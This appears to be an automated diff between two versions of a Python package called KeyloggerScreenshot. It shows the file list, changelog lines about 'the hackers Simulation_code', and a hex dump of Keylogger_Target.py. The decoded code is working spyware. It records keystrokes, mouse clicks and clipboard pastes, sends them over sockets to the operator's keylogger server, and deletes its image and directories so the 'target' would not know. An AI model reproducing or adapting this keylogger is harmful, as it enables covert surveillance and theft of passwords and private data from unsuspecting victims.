# Comparing `tmp/KeyloggerScreenshot-0.4.1.tar.gz` & `tmp/KeyloggerScreenshot-0.4.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.4.1.tar", last modified: Mon May  8 19:37:08 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.4.2.tar", last modified: Tue May 23 09:22:56 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.4.1.tar` & `KeyloggerScreenshot-0.4.2.tar`

### file list

```diff
@@ -1,33 +1,33 @@
-drwxrwxrwx   0        0        0        0 2023-05-08 19:37:08.501894 KeyloggerScreenshot-0.4.1/
--rw-rw-rw-   0        0        0     4546 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/CHANGELOG.txt
--rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.4.1/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-05-08 19:37:08.453704 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    14618 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1294 2023-05-08 18:39:37.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Local_Deleter.py
--rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     6600 2023-05-08 18:36:28.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     8495 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-08 19:37:08.498816 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0    10639 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      718 2023-05-08 19:37:08.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.1/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.1/MANIFEST.in
--rw-rw-rw-   0        0        0    10639 2023-05-08 19:37:08.500903 KeyloggerScreenshot-0.4.1/PKG-INFO
--rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.1/README.md
--rw-rw-rw-   0        0        0     8358 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/Simualation_code.py
--rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.1/client.py
--rw-rw-rw-   0        0        0      656 2023-05-08 19:18:30.000000 KeyloggerScreenshot-0.4.1/demon_server.py
--rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.1/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.1/requirements.py
--rw-rw-rw-   0        0        0       42 2023-05-08 19:37:08.502893 KeyloggerScreenshot-0.4.1/setup.cfg
--rw-rw-rw-   0        0        0     1065 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/setup.py
--rw-rw-rw-   0        0        0      269 2023-05-08 19:18:30.000000 KeyloggerScreenshot-0.4.1/target.py
--rw-rw-rw-   0        0        0      240 2023-05-08 19:06:24.000000 KeyloggerScreenshot-0.4.1/test.py
--rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.1/tester.py
+drwxrwxrwx   0        0        0        0 2023-05-23 09:22:56.927011 KeyloggerScreenshot-0.4.2/
+-rw-rw-rw-   0        0        0     4657 2023-05-23 09:18:57.000000 KeyloggerScreenshot-0.4.2/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.4.2/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-05-23 09:22:56.877146 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    14907 2023-05-23 09:09:13.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1236 2023-05-09 06:01:08.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Local_Deleter.py
+-rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     6600 2023-05-08 18:36:28.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     8467 2023-05-09 06:29:03.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-23 09:22:56.924994 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0    10750 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      718 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       47 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-05-23 09:22:56.000000 KeyloggerScreenshot-0.4.2/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.2/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.2/MANIFEST.in
+-rw-rw-rw-   0        0        0    10750 2023-05-23 09:22:56.927011 KeyloggerScreenshot-0.4.2/PKG-INFO
+-rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.2/README.md
+-rw-rw-rw-   0        0        0     8358 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.2/Simualation_code.py
+-rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.2/client.py
+-rw-rw-rw-   0        0        0      657 2023-05-23 09:01:42.000000 KeyloggerScreenshot-0.4.2/demon_server.py
+-rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.2/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.2/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-05-23 09:22:56.927011 KeyloggerScreenshot-0.4.2/setup.cfg
+-rw-rw-rw-   0        0        0     1065 2023-05-23 09:22:50.000000 KeyloggerScreenshot-0.4.2/setup.py
+-rw-rw-rw-   0        0        0      269 2023-05-23 09:01:42.000000 KeyloggerScreenshot-0.4.2/target.py
+-rw-rw-rw-   0        0        0      179 2023-05-23 09:04:50.000000 KeyloggerScreenshot-0.4.2/test.py
+-rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.2/tester.py
```

### Comparing `KeyloggerScreenshot-0.4.1/CHANGELOG.txt` & `KeyloggerScreenshot-0.4.2/CHANGELOG.txt`

 * *Files 2% similar despite different names*

```diff
@@ -166,8 +166,13 @@
 - More intelligent Keylogger
 - If backspace is pressed the last pressed character will be deleted from the list
 - Detects if backspace is hold for a long time
 
 0.4.1 (08/05/2023)
 -------------------
 - Fixed Interruption Error
-- Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
+- Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
+
+0.4.2 (23/05/2023)
+------------------
+- Fixed simulation Error
+- Every coordinate will be shown by order
```

### Comparing `KeyloggerScreenshot-0.4.1/KLS_start.py` & `KeyloggerScreenshot-0.4.2/KLS_start.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.4.2/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files 4% similar despite different names*

```diff
@@ -342,573 +342,591 @@
 00001550: 6f75 6c64 6e27 7420 6265 2074 6865 2073  ouldn't be the s
 00001560: 616d 6520 7468 6520 7365 7276 6572 5f70  ame the server_p
 00001570: 686f 746f 7320 616e 6420 7468 6520 7365  hotos and the se
 00001580: 7276 6572 5f6b 6579 6c6f 6767 6572 2073  rver_keylogger s
 00001590: 686f 756c 646e 2774 2062 650d 0a20 2020  houldn't be..   
 000015a0: 2020 2020 2020 2020 2023 2069 6e20 7468           # in th
 000015b0: 6520 7361 6d65 2066 6f6c 6465 720d 0a20  e same folder.. 
-000015c0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-000015d0: 636f 6f72 6469 6e61 7465 7320 3d20 6c69  coordinates = li
-000015e0: 7374 2873 6574 2873 656c 662e 636f 6f72  st(set(self.coor
-000015f0: 6469 6e61 7465 7329 290d 0a20 2020 2020  dinates))..     
-00001600: 2020 2020 2020 2023 2054 6869 7320 6368         # This ch
-00001610: 6563 6b73 2069 6620 7468 6520 636f 6f72  ecks if the coor
-00001620: 6469 6e61 7465 7320 6f63 6375 7220 3220  dinates occur 2 
-00001630: 7469 6d65 730d 0a20 2020 2020 2020 2020  times..         
-00001640: 2020 2070 7269 6e74 2873 656c 662e 636f     print(self.co
-00001650: 6f72 6469 6e61 7465 7329 0d0a 2020 2020  ordinates)..    
-00001660: 2020 2020 2020 2020 776f 7274 203d 2022          wort = "
-00001670: 220d 0a20 2020 2020 2020 2020 2020 2066  "..            f
-00001680: 6f72 207a 6569 6368 656e 2069 6e20 7365  or zeichen in se
-00001690: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
-000016a0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
-000016b0: 2020 2020 776f 7274 202b 3d20 7a65 6963      wort += zeic
-000016c0: 6865 6e0d 0a0d 0a20 2020 2020 2020 2020  hen....         
-000016d0: 2020 2023 2047 6574 7320 7468 6520 636f     # Gets the co
-000016e0: 6f72 6469 6e61 7465 7320 7768 6572 6520  ordinates where 
-000016f0: 7468 6520 7461 7267 6574 2077 6173 2077  the target was w
-00001700: 7269 7469 6e67 2073 6f6d 6574 6869 6e67  riting something
-00001710: 2066 726f 6d20 7468 6520 6265 6769 6e6e   from the beginn
-00001720: 696e 670d 0a20 2020 2020 2020 2020 2020  ing..           
-00001730: 2073 656c 662e 636f 6f72 6469 6e61 7465   self.coordinate
-00001740: 7320 3d20 7365 6c66 2e63 6f6f 7264 696e  s = self.coordin
-00001750: 6174 6573 5b3a 3a2d 315d 0d0a 2020 2020  ates[::-1]..    
-00001760: 2020 2020 2020 2020 2320 5365 6e64 7320          # Sends 
-00001770: 7468 6520 6461 7461 2074 6f20 7365 7276  the data to serv
-00001780: 6572 5f6b 6579 6c6f 6767 6572 0d0a 2020  er_keylogger..  
-00001790: 2020 2020 2020 2020 2020 616c 6c5f 6461            all_da
-000017a0: 7461 203d 2073 7472 2873 656c 662e 636f  ta = str(self.co
-000017b0: 6f72 6469 6e61 7465 7329 202b 2077 6f72  ordinates) + wor
-000017c0: 740d 0a20 2020 2020 2020 2020 2020 2023  t..            #
-000017d0: 2043 6f6f 7264 696e 6174 6573 2061 6e64   Coordinates and
-000017e0: 206b 6579 6461 7461 2061 7265 2062 6569   keydata are bei
-000017f0: 6e67 2063 6f6e 6361 7465 6e61 7465 640d  ng concatenated.
-00001800: 0a20 2020 2020 2020 2020 2020 206b 6579  .            key
-00001810: 5f64 6174 612e 7365 6e64 2861 6c6c 5f64  _data.send(all_d
-00001820: 6174 612e 656e 636f 6465 2829 290d 0a20  ata.encode()).. 
-00001830: 2020 2020 2020 2020 2020 2070 7269 6e74             print
-00001840: 2877 6f72 7429 0d0a 2020 2020 2020 2020  (wort)..        
-00001850: 2020 2020 7072 696e 7428 7365 6c66 2e72      print(self.r
-00001860: 6963 6874 6967 655f 6c69 7374 6529 0d0a  ichtige_liste)..
-00001870: 2020 2020 2020 2020 2020 2020 6668 616e              fhan
-00001880: 646c 652e 636c 6f73 6528 290d 0a20 2020  dle.close()..   
-00001890: 2020 2020 2020 2020 2023 2043 6c6f 7365           # Close
-000018a0: 7320 7468 6520 696d 6167 650d 0a20 2020  s the image..   
-000018b0: 2020 2020 2020 2020 206f 732e 7265 6d6f           os.remo
-000018c0: 7665 2822 496d 6167 652e 706e 6722 290d  ve("Image.png").
-000018d0: 0a20 2020 2020 2020 2020 2020 2023 2044  .            # D
-000018e0: 656c 6574 6573 2074 6865 2069 6d61 6765  eletes the image
-000018f0: 2069 6e20 7468 6520 6375 7272 656e 7420   in the current 
-00001900: 6469 7265 6374 6f72 790d 0a20 2020 2020  directory..     
-00001910: 2020 2020 2020 206f 732e 6368 6469 7228         os.chdir(
-00001920: 222e 2e22 290d 0a20 2020 2020 2020 2020  "..")..         
-00001930: 2020 2023 2057 6520 6861 7665 2074 6f20     # We have to 
-00001940: 676f 2062 6163 6b20 736f 2074 6861 7420  go back so that 
-00001950: 7765 2063 616e 2064 656c 6574 6520 7468  we can delete th
-00001960: 6520 6f74 6865 7220 6469 7265 6374 6f72  e other director
-00001970: 6965 730d 0a20 2020 2020 2020 2020 2020  ies..           
-00001980: 2066 6f72 2065 6163 685f 6469 7220 696e   for each_dir in
-00001990: 2072 616e 646f 6d5f 6c73 743a 0d0a 2020   random_lst:..  
-000019a0: 2020 2020 2020 2020 2020 2020 2020 7368                sh
-000019b0: 7574 696c 2e72 6d74 7265 6528 6561 6368  util.rmtree(each
-000019c0: 5f64 6972 290d 0a20 2020 2020 2020 2020  _dir)..         
-000019d0: 2020 2020 2020 2023 2054 6869 7320 6465         # This de
-000019e0: 6c65 7465 7320 6576 6572 7920 6469 7265  letes every dire
-000019f0: 6374 6f72 790d 0a20 2020 2020 2020 2020  ctory..         
-00001a00: 2020 2073 7973 2e65 7869 7428 290d 0a20     sys.exit().. 
-00001a10: 2020 2020 2020 2020 2020 2023 2053 746f             # Sto
-00001a20: 7073 2074 6865 206b 6579 6c6f 6767 6572  ps the keylogger
-00001a30: 0d0a 2020 2020 2020 2020 6578 6365 7074  ..        except
-00001a40: 204b 6579 626f 6172 6449 6e74 6572 7275   KeyboardInterru
-00001a50: 7074 3a0d 0a20 2020 2020 2020 2020 2020  pt:..           
-00001a60: 2023 2049 6620 7468 6520 7461 7267 6574   # If the target
-00001a70: 2068 6173 2064 6573 7472 6f79 6564 2074   has destroyed t
-00001a80: 6865 2063 6f6e 6e65 6374 696f 6e0d 0a20  he connection.. 
-00001a90: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
-00001aa0: 3d20 222a 2a2a 25c2 a7c2 a729 c2a7 c2a7  = "***%....)....
-00001ab0: 2522 0d0a 2020 2020 2020 2020 2020 2020  %"..            
-00001ac0: 2320 5468 6973 2069 7320 6c69 6b65 2061  # This is like a
-00001ad0: 2073 7065 6369 616c 2063 6f64 652e 2054   special code. T
-00001ae0: 6f20 7370 6c69 7420 6974 2061 7420 7468  o split it at th
-00001af0: 6520 656e 640d 0a20 2020 2020 2020 2020  e end..         
-00001b00: 2020 2066 6f72 207a 6569 6368 656e 2069     for zeichen i
-00001b10: 6e20 7365 6c66 2e72 6963 6874 6967 655f  n self.richtige_
-00001b20: 6c69 7374 653a 0d0a 2020 2020 2020 2020  liste:..        
-00001b30: 2020 2020 2020 2020 776f 7274 202b 3d20          wort += 
-00001b40: 7a65 6963 6865 6e0d 0a20 2020 2020 2020  zeichen..       
-00001b50: 2020 2020 2069 6620 7365 6c66 2e63 6f6f       if self.coo
-00001b60: 7264 696e 6174 6573 3a0d 0a20 2020 2020  rdinates:..     
-00001b70: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00001b80: 636f 6f72 6469 6e61 7465 7320 3d20 7365  coordinates = se
-00001b90: 6c66 2e63 6f6f 7264 696e 6174 6573 5b3a  lf.coordinates[:
-00001ba0: 3a2d 315d 0d0a 2020 2020 2020 2020 2020  :-1]..          
-00001bb0: 2020 2020 2020 2320 5468 6973 2069 7320        # This is 
-00001bc0: 7468 6520 7361 6d65 2061 7320 6162 6f76  the same as abov
-00001bd0: 650d 0a20 2020 2020 2020 2020 2020 2020  e..             
-00001be0: 2020 2077 6f72 7420 2b3d 2073 7472 2873     wort += str(s
-00001bf0: 656c 662e 636f 6f72 6469 6e61 7465 7329  elf.coordinates)
-00001c00: 0d0a 2020 2020 2020 2020 2020 2020 6461  ..            da
-00001c10: 7461 203d 2066 2254 4845 2043 4f4e 4e45  ta = f"THE CONNE
-00001c20: 4354 494f 4e20 4841 5320 4245 454e 2049  CTION HAS BEEN I
-00001c30: 4e54 4552 5255 5054 4544 7b77 6f72 747d  NTERRUPTED{wort}
-00001c40: 220d 0a20 2020 2020 2020 2020 2020 2023  "..            #
-00001c50: 2054 6869 7320 6c65 7427 7320 7468 6520   This let's the 
-00001c60: 7365 7276 6572 206b 6e6f 7720 7468 6174  server know that
-00001c70: 2074 6865 2073 6572 7665 7220 7368 6f75   the server shou
-00001c80: 6c64 2073 6875 7420 646f 776e 0d0a 2020  ld shut down..  
-00001c90: 2020 2020 2020 2020 2020 6b65 795f 6461            key_da
-00001ca0: 7461 2e63 6f6e 6e65 6374 2828 6970 5f6b  ta.connect((ip_k
-00001cb0: 6579 6c6f 6767 6572 2c20 706f 7274 5f6b  eylogger, port_k
-00001cc0: 6579 6c6f 6767 6572 2929 0d0a 2020 2020  eylogger))..    
-00001cd0: 2020 2020 2020 2020 6b65 795f 6461 7461          key_data
-00001ce0: 2e73 656e 6428 6461 7461 2e65 6e63 6f64  .send(data.encod
-00001cf0: 6528 2929 0d0a 2020 2020 2020 2020 2020  e())..          
-00001d00: 2020 6b65 795f 6461 7461 2e63 6c6f 7365    key_data.close
-00001d10: 2829 0d0a 0d0a 2020 2020 2020 2020 2020  ()....          
-00001d20: 2020 6966 206f 732e 7061 7468 2e65 7869    if os.path.exi
-00001d30: 7374 7328 2249 6d61 6765 2e70 6e67 2229  sts("Image.png")
-00001d40: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-00001d50: 2020 2023 2049 7420 7769 6c6c 2064 6573     # It will des
-00001d60: 7472 6f79 2074 6865 2069 6d61 6765 2073  troy the image s
-00001d70: 6f20 7461 7267 6574 2077 6f75 6e64 206b  o target wound k
-00001d80: 6e6f 7720 616e 7974 6869 6e67 0d0a 2020  now anything..  
-00001d90: 2020 2020 2020 2020 2020 2020 2020 6668                fh
-00001da0: 616e 646c 652e 636c 6f73 6528 290d 0a0d  andle.close()...
-00001db0: 0a20 2020 2020 2020 2020 2020 206e 6577  .            new
-00001dc0: 5f73 6572 7665 7220 3d20 736f 636b 6574  _server = socket
-00001dd0: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
-00001de0: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
-00001df0: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
-00001e00: 2020 2020 2020 2020 206e 6577 5f73 6572           new_ser
-00001e10: 7665 722e 636f 6e6e 6563 7428 2822 3132  ver.connect(("12
-00001e20: 372e 302e 302e 3122 2c20 3130 3737 2929  7.0.0.1", 1077))
-00001e30: 0d0a 2020 2020 2020 2020 2020 2020 6e65  ..            ne
-00001e40: 775f 7365 7276 6572 2e73 656e 6428 2264  w_server.send("d
-00001e50: 6f6e 6522 2e65 6e63 6f64 6528 2929 0d0a  one".encode())..
-00001e60: 2020 2020 2020 2020 2020 2020 6e65 775f              new_
-00001e70: 7365 7276 6572 2e63 6c6f 7365 2829 0d0a  server.close()..
-00001e80: 0d0a 0d0a 0d0a 2020 2020 6465 6620 6b69  ......    def ki
-00001e90: 6c6c 5f73 7769 7463 6828 7365 6c66 293a  ll_switch(self):
-00001ea0: 0d0a 2020 2020 2020 2020 2320 5468 6973  ..        # This
-00001eb0: 2066 756e 6374 696f 6e20 6465 7374 726f   function destro
-00001ec0: 7973 2074 6865 206d 6f75 7365 2069 6e66  ys the mouse inf
-00001ed0: 6f0d 0a20 2020 2020 2020 206e 6577 5f73  o..        new_s
-00001ee0: 6563 6f6e 6473 203d 2073 656c 662e 6475  econds = self.du
-00001ef0: 7261 7469 6f6e 202b 2035 0d0a 2020 2020  ration + 5..    
-00001f00: 2020 2020 2320 3230 2073 6563 6f6e 6473      # 20 seconds
-00001f10: 2061 7265 2062 6569 6e67 2061 6464 6564   are being added
-00001f20: 2062 6563 6175 7365 2074 6865 7265 206d   because there m
-00001f30: 6967 6874 2062 6520 6120 7072 6f62 6c65  ight be a proble
-00001f40: 6d0d 0a20 2020 2020 2020 2066 6f72 2078  m..        for x
-00001f50: 2069 6e20 7261 6e67 6528 6e65 775f 7365   in range(new_se
-00001f60: 636f 6e64 7329 3a0d 0a20 2020 2020 2020  conds):..       
-00001f70: 2020 2020 2074 696d 652e 736c 6565 7028       time.sleep(
-00001f80: 3129 0d0a 2020 2020 2020 2020 2320 5468  1)..        # Th
-00001f90: 6973 2073 746f 7065 7320 7468 650d 0a20  is stopes the.. 
-00001fa0: 2020 2020 2020 2073 7973 2e65 7869 7428         sys.exit(
-00001fb0: 290d 0a0d 0a20 2020 2064 6566 206f 6e5f  )....    def on_
-00001fc0: 636c 6963 6b28 7365 6c66 2c20 782c 2079  click(self, x, y
-00001fd0: 2c20 6275 7474 6f6e 2c20 7072 6573 7365  , button, presse
-00001fe0: 6429 3a0d 0a20 2020 2020 2020 2023 2054  d):..        # T
-00001ff0: 6869 7320 6973 2074 6865 2063 6c69 636b  his is the click
-00002000: 2066 756e 6374 696f 6e0d 0a20 2020 2020   function..     
-00002010: 2020 2070 7269 6e74 2866 2254 6172 6765     print(f"Targe
-00002020: 7420 6861 7320 7072 6573 7365 6420 7b78  t has pressed {x
-00002030: 7d20 616e 6420 7b79 7d22 290d 0a20 2020  } and {y}")..   
-00002040: 2020 2020 2023 2041 6c6c 2074 6865 2063       # All the c
-00002050: 6f6f 7264 696e 6174 6573 2077 696c 6c20  oordinates will 
-00002060: 6265 2073 746f 7265 6420 696e 2022 7365  be stored in "se
-00002070: 6c66 2e63 6f6f 7264 696e 6174 6573 220d  lf.coordinates".
-00002080: 0a20 2020 2020 2020 2073 656c 662e 636f  .        self.co
-00002090: 6f72 6469 6e61 7465 732e 6170 7065 6e64  ordinates.append
-000020a0: 2828 782c 2079 2929 0d0a 0d0a 2020 2020  ((x, y))....    
-000020b0: 6465 6620 616c 6c5f 636c 6963 6b73 2873  def all_clicks(s
-000020c0: 656c 6629 3a0d 0a20 2020 2020 2020 2023  elf):..        #
-000020d0: 2054 6869 7320 6973 206a 7573 7420 6120   This is just a 
-000020e0: 6675 6e63 7469 6f6e 2073 6f20 6974 2063  function so it c
-000020f0: 616e 2062 6520 7261 6e20 7769 7468 2074  an be ran with t
-00002100: 6872 6561 6469 6e67 0d0a 2020 2020 2020  hreading..      
-00002110: 2020 7769 7468 204c 6973 7465 6e65 7228    with Listener(
-00002120: 6f6e 5f63 6c69 636b 3d73 656c 662e 6f6e  on_click=self.on
-00002130: 5f63 6c69 636b 2920 6173 206c 6973 7465  _click) as liste
-00002140: 6e69 6e67 3a0d 0a20 2020 2020 2020 2020  ning:..         
-00002150: 2020 2073 656c 662e 6b69 6c6c 5f73 7769     self.kill_swi
-00002160: 7463 6828 290d 0a20 2020 2020 2020 2020  tch()..         
-00002170: 2020 206c 6973 7465 6e69 6e67 2e6a 6f69     listening.joi
-00002180: 6e28 290d 0a0d 0a20 2020 2064 6566 2063  n()....    def c
-00002190: 6f70 795f 6461 7461 2873 656c 6629 3a0d  opy_data(self):.
-000021a0: 0a20 2020 2020 2020 2073 656c 662e 7269  .        self.ri
-000021b0: 6368 7469 6765 5f6c 6973 7465 2e61 7070  chtige_liste.app
-000021c0: 656e 6428 2220 2843 4f50 5920 2853 7472  end(" (COPY (Str
-000021d0: 672b 6329 2920 2229 0d0a 0d0a 2020 2020  g+c)) ")....    
-000021e0: 6465 6620 6170 7065 6e64 5f70 6173 7465  def append_paste
-000021f0: 2873 656c 6629 3a0d 0a20 2020 2020 2020  (self):..       
-00002200: 2064 6174 6120 3d20 6622 2028 7b70 7970   data = f" ({pyp
-00002210: 6572 636c 6970 2e70 6173 7465 2829 7d20  erclip.paste()} 
-00002220: 7c20 5041 5354 4520 2853 7472 672b 7629  | PASTE (Strg+v)
-00002230: 2920 7c20 220d 0a20 2020 2020 2020 2073  ) | "..        s
-00002240: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
-00002250: 7465 2e61 7070 656e 6428 6461 7461 290d  te.append(data).
-00002260: 0a0d 0a20 2020 2064 6566 2070 7269 6e74  ...    def print
-00002270: 5f77 6f72 6b28 7365 6c66 2c20 776f 7264  _work(self, word
-00002280: 293a 0d0a 2020 2020 2020 2020 7072 696e  ):..        prin
-00002290: 7428 6627 416c 7068 6162 6574 6963 206b  t(f'Alphabetic k
-000022a0: 6579 2077 6173 2070 7265 7373 6564 3a20  ey was pressed: 
-000022b0: 7b77 6f72 647d 2027 290d 0a20 2020 2020  {word} ')..     
-000022c0: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
-000022d0: 5f6c 6973 7465 202b 3d20 776f 7264 0d0a  _liste += word..
-000022e0: 2020 2020 2020 2020 2320 4576 6572 7920          # Every 
-000022f0: 7072 6573 7365 6420 6b65 7920 7769 6c6c  pressed key will
-00002300: 2062 6520 7361 7665 6420 696e 2022 7269   be saved in "ri
-00002310: 6368 7469 6765 5f6c 6973 7465 2220 7468  chtige_liste" th
-00002320: 6973 2069 7320 6120 6765 726d 616e 2073  is is a german s
-00002330: 656c 662e 776f 7264 2061 6e64 206d 6561  elf.word and mea
-00002340: 6e73 2022 7269 6768 745f 6c69 7374 220d  ns "right_list".
-00002350: 0a0d 0a20 2020 2064 6566 206f 6e5f 7072  ...    def on_pr
-00002360: 6573 7328 7365 6c66 2c20 6b65 7929 3a0d  ess(self, key):.
-00002370: 0a20 2020 2020 2020 2074 7279 3a0d 0a20  .        try:.. 
-00002380: 2020 2020 2020 2020 2020 2074 7279 3a0d             try:.
-00002390: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000023a0: 206f 7468 6572 5f63 6861 7265 6374 6572   other_charecter
-000023b0: 7320 3d20 7b22 3122 3a20 2221 222c 2022  s = {"1": "!", "
-000023c0: 3222 3a20 2722 272c 2022 3322 3a20 22c2  2": '"', "3": ".
-000023d0: a722 2c20 2234 223a 2022 2422 2c20 2235  .", "4": "$", "5
-000023e0: 223a 2022 2522 2c20 2236 223a 2022 2622  ": "%", "6": "&"
-000023f0: 2c20 2237 223a 2022 2f22 2c20 2238 223a  , "7": "/", "8":
-00002400: 2022 2822 2c0d 0a20 2020 2020 2020 2020   "(",..         
-00002410: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002420: 2020 2020 2020 2020 2020 2022 3922 3a20             "9": 
-00002430: 2229 222c 2022 3022 3a20 223d 222c 2022  ")", "0": "=", "
-00002440: c39f 223a 2022 3f22 7d0d 0a20 2020 2020  ..": "?"}..     
-00002450: 2020 2020 2020 2020 2020 2069 6620 7365             if se
-00002460: 6c66 2e63 6170 7320 6973 2054 7275 653a  lf.caps is True:
-00002470: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
